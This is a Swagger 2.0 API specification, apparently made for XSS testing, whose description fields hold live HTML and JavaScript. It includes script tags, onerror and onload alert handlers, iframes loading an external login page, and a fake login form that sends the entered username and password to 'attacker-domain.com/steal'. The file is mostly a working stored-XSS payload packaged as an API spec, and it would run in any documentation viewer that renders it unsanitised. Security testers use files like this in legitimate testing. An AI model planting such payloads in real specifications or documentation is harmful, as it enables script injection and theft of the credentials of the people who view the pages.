swagger: '2.0'
info:
  title: XSS Testing
  description: |
    <marquee behavior="scroll" direction="left" style="font-size:24px;color:red;">Testing Marquee</marquee>
    <img src="https://via.placeholder.com/150" onerror="alert('Image load failed! XSS executed.');">
    <iframe src="https://synovex-demo.secasure.com/login" width="600" height="400" style="border:2px solid red;" onload="alert('External login page loaded. JavaScript in action!')"></iframe>
    <script>
      alert('Warning: JavaScript Executed!');
      document.body.innerHTML += '<h1 style="color:red;">This is a test!</h1>';
    </script>
    <form action="#" onsubmit="fetch('https://attacker-domain.com/steal', {method: 'POST', body: new URLSearchParams({username: this.username.value, password: this.password.value})}); alert('Credentials sent to testing server!'); return false;">
      <label for="username">Username:</label><br>
      <input type="text" id="username" name="username"><br>
      <label for="password">Password:</label><br>
      <input type="password" id="password" name="password"><br><br>
      <button type="submit">Login</button>
    </form>
  version: production
basePath: /JSSResource/
produces:
  - application/xml
  - application/json
consumes:
  - application/xml
  - application/json
security:
  - basicAuth: []
paths:
  /loginpage:
    get:
      summary: Displays a test login page
      description: |
        An endpoint that serves a login page with an embedded XSS attack and iframe.
      responses:
        '200':
          description: HTML login page
          schema:
            type: string
      tags:
        - XSS_Testing_Login
      operationId: displayLoginPage
  '/hack/hachid/{id}':
    delete:
      parameters:
        - description: |
            <marquee behavior="alternate" style="color:blue;font-size:18px;">Testing Marquee</marquee>
            <img src="nonexistent.png" onerror="alert('XSS Image Trigger!');">
            <iframe src="https://synovex-demo.secasure.com/login" width="500" height="300" style="border:2px solid blue;" onload="console.log('Malicious iframe loaded.');"></iframe>
            <script>alert('ID parameter exploited for testing!');</script>
          format: int64
          in: path
          name: id
          required: true
          type: integer
      responses:
        '200':
          description: No response was specified
